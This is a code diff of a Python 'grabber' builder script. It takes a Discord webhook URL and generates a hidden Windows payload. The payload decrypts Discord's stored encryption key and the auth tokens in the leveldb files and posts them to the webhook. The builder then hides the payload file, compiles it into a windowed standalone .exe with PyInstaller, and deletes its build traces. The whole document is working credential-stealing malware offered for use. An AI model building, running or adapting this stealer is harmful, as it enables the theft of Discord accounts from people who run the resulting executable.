@@ -1,128 +1,65 @@
 # Copyright (c) Kernel-Tool
 # See the file 'LICENSE' for copying permission
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
+# ------------------------------------------------------------------------------------------------
 # EN:
-#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
+#     - Do not touch or modify the code below. If there is an error, please contact the owner,
+#       but under no circumstances should you touch the code.
 #     - Do not resell this tool, do not credit it to yours.
 # FR:
-#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
+#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le
+#       propriétaire, mais en aucun cas vous ne devez toucher au code.
 #     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
+# ------------------------------------------------------------------------------------------------
 
 import os
 import sys
 import subprocess
 import shutil
 import ctypes
+import site
+import glob as _glob
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+from Config.Config import grabber_banner
 
-class Colors:
-    @staticmethod
-    def purple_to_cyan(steps):
-        colors = []
-        for i in range(steps):
-            t = i / max(1, steps - 1)
-            r = int(255 + (0 - 255) * t)
-            g = int(0 + (255 - 0) * t)
-            b = int(255 + (255 - 255) * t)
-            colors.append((r, g, b))
-        return colors
-    
-    @staticmethod
-    def green_to_cyan(steps):
-        colors = []
-        for i in range(steps):
-            t = i / max(1, steps - 1)
-            r = int(0 + (0 - 0) * t)
-            g = int(255 + (255 - 255) * t)
-            b = int(0 + (255 - 0) * t)
-            colors.append((r, g, b))
-        return colors
-    
-    @staticmethod
-    def red_to_yellow(steps):
-        colors = []
-        for i in range(steps):
-            t = i / max(1, steps - 1)
-            r = int(255 + (255 - 255) * t)
-            g = int(0 + (255 - 0) * t)
-            b = int(0 + (0 - 0) * t)
-            colors.append((r, g, b))
-        return colors
+LC = "\033[38;2;0;200;255m"
+RS = "\033[0m"
 
-class Center:
-    @staticmethod
-    def XCenter(text):
-        lines = text.split('\n')
-        terminal_width = shutil.get_terminal_size((80, 20)).columns
-        centered = []
-        for line in lines:
-            stripped = line.rstrip()
-            if stripped:
-                spaces = (terminal_width - len(stripped)) // 2
-                centered.append(' ' * spaces + stripped)
-            else:
-                centered.append('')
-        return '\n'.join(centered)
-
-class Colorate:
-    @staticmethod
-    def Horizontal(color_func, text, step=1):
-        lines = text.split('\n')
-        total_chars = sum(len(line) for line in lines)
-        colors = color_func(total_chars)
-        
-        result = []
-        color_index = 0
-        
-        for line in lines:
-            colored_line = ""
-            for char in line:
-                if color_index < len(colors):
-                    r, g, b = colors[color_index]
-                    colored_line += f"\033[38;2;{r};{g};{b}m{char}"
-                    color_index += step
-                else:
-                    colored_line += char
-            result.append(colored_line)
-        
-        return '\n'.join(result) + "\033[0m"
-
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-def Write(text):
+def W(text):
     print(text, end='', flush=True)
 
-def set_file_attributes(p):
+def set_hidden(p):
     try:
         ctypes.windll.kernel32.SetFileAttributesW(p, 6)
     except:
         pass
 
+def get_pywin32_binaries():
+    args = []
+    try:
+        sp = site.getsitepackages()[0]
+        for d, dest in [(os.path.join(sp, 'win32'), 'win32'), (os.path.join(sp, 'pywin32_system32'), '.')]:
+            for pat in ['*.pyd', '*.dll']:
+                for f in _glob.glob(os.path.join(d, pat)):
+                    args += ['--add-binary', f'{f};{dest}']
+    except:
+        pass
+    return args
+
 def main():
-    clear_screen()
-    
-    ascii_art = """
- ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
-██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
-██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
-██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
-╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
- ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
-    """
-    
-    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(ascii_art)))
-    print("\n")
-    
-    Write(Colorate.Horizontal(Colors.green_to_cyan, "Webhook : "))
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+    print(grabber_banner)
+    print()
+    W(f"{LC}Webhook : {RS}")
     w = input().strip()
-    
+
     if not w.startswith('https://discord.com/api/webhooks/'):
-        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nWebhook invalide!\n'))
+        print(f"{LC}Invalid webhook!{RS}")
         sys.exit()
-    
-    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Choose file name : '))
+
+    W(f"{LC}Output file name : {RS}")
     n = input().strip() or 'grabber'
-    
+
     c = '''import os
 import json
 import base64
@@ -135,96 +72,98 @@ import sys
 WEBHOOK_URL="{webhook_url}"
 if sys.platform=="win32":
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
-def get_encryption_key():
+def get_key():
     try:
         p=os.path.expandvars(r"%APPDATA%\\discord\\Local State")
         with open(p,"r",encoding="utf-8")as f:j=json.load(f)
-        k=win32crypt.CryptUnprotectData(base64.b64decode(j["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
-        return k
+        return win32crypt.CryptUnprotectData(base64.b64decode(j["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
     except:
         return None
-def decrypt_payload(c,k):
+def decrypt(c,k):
     try:
-        n=c[3:15]
-        ci=AES.new(k,AES.MODE_GCM,nonce=n)
+        ci=AES.new(k,AES.MODE_GCM,nonce=c[3:15])
         return ci.decrypt_and_verify(c[15:-16],c[-16:]).decode()
     except:
         return""
 def find_tokens(p,k):
     t=[]
-    r=re.compile(b"dQw4w9WgXcQ:[^\\\"]*")
+    r=re.compile(b"dQw4w9WgXcQ:[^\\"]*")
     for f in os.listdir(p):
         if not(f.endswith(".log")or f.endswith(".ldb")):continue
         try:
             with open(os.path.join(p,f),"rb")as bf:d=bf.read()
             for m in r.findall(d):
                 try:
-                    dt=decrypt_payload(base64.b64decode(m[len(b"dQw4w9WgXcQ:"):]),k)
+                    dt=decrypt(base64.b64decode(m[len(b"dQw4w9WgXcQ:"):]),k)
                     if dt and len(dt.split('.'))==3:t.append(dt)
                 except:continue
         except:continue
     return t
-def send_to_webhook(t):
+def send(t):
     if not t:return
     try:
-        requests.post(WEBHOOK_URL,json={"content":"**Tokens Discord :**\\n"+"\\n".join(t)})
+        requests.post(WEBHOOK_URL,json={"content":"**Discord Tokens :**\\n"+"\\n".join(t)})
     except:pass
 if __name__=="__main__":
     p=os.path.expandvars(r"%APPDATA%\\discord\\Local Storage\\leveldb")
     if not os.path.exists(p):sys.exit()
-    k=get_encryption_key()
+    k=get_key()
     if not k:sys.exit()
-    send_to_webhook(list(set(find_tokens(p,k))))'''
-    
+    send(list(set(find_tokens(p,k))))'''
+
     os.makedirs('output', exist_ok=True)
     t = f'output/{n}_temp.py'
     e = f'output/{n}.exe'
-    
+
     print()
-    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Creation du payload...\n'))
-    
+    print(f"{LC}Building payload...{RS}")
+
     with open(t, 'w', encoding='utf-8') as f:
         f.write(c.replace('{webhook_url}', w))
-    
-    set_file_attributes(t)
-    
-    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Compilation en cours...\n'))
-    
+
+    set_hidden(t)
+    print(f"{LC}Compiling...{RS}")
+
     if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
-        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nPyInstaller non installe!\n'))
-        Write(Colorate.Horizontal(Colors.green_to_cyan, '   pip install pyinstaller\n'))
+        print(f"{LC}PyInstaller not found! Run: pip install pyinstaller{RS}")
         sys.exit()
-    
+
     r = subprocess.run([
         'pyinstaller',
-        '--onefile',
-        '--windowed',
+        '--onefile', '--windowed',
+        '--hidden-import', 'win32crypt',
+        '--hidden-import', 'win32api',
+        '--hidden-import', 'win32con',
+        '--hidden-import', 'win32security',
+        '--hidden-import', 'pywintypes',
+        '--hidden-import', 'winerror',
         '--hidden-import', 'Crypto',
         '--hidden-import', 'Crypto.Cipher',
-        '--hidden-import', 'win32crypt',
-        '--noconfirm',
-        '--clean',
+        '--hidden-import', 'Crypto.Cipher.AES',
+        '--collect-all', 'Crypto',
+        *get_pywin32_binaries(),
+        '--noconfirm', '--clean',
         t
     ], capture_output=True, text=True)
-    
+
     if r.returncode != 0:
-        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nErreur de compilation!\n'))
+        print(f"{LC}Compilation error!{RS}")
         print(r.stderr[:500])
         sys.exit()
-    
+
     shutil.move(f'dist/{n}_temp.exe', e)
-    
+
     for p in [t, f'{n}_temp.spec', 'build', 'dist', '__pycache__']:
         try:
             os.remove(p) if os.path.isfile(p) else shutil.rmtree(p, ignore_errors=True)
         except:
             pass
-    
+
     print()
-    success_banner = "══════════════════════════════════════════════════════════════════════\n                         COMPILATION REUSSIE!\n══════════════════════════════════════════════════════════════════════"
-    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(success_banner)))
-    print("\n")
-    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Fichier : output/{n}.exe\n"))
+    print(f"{LC}══════════════════════════════════════════════════════════════════════{RS}")
+    print(f"{LC}                         BUILD SUCCESSFUL!{RS}")
+    print(f"{LC}══════════════════════════════════════════════════════════════════════{RS}")
+    print(f"{LC}Output : output/{n}.exe{RS}")
     print()
 
 if __name__ == "__main__":
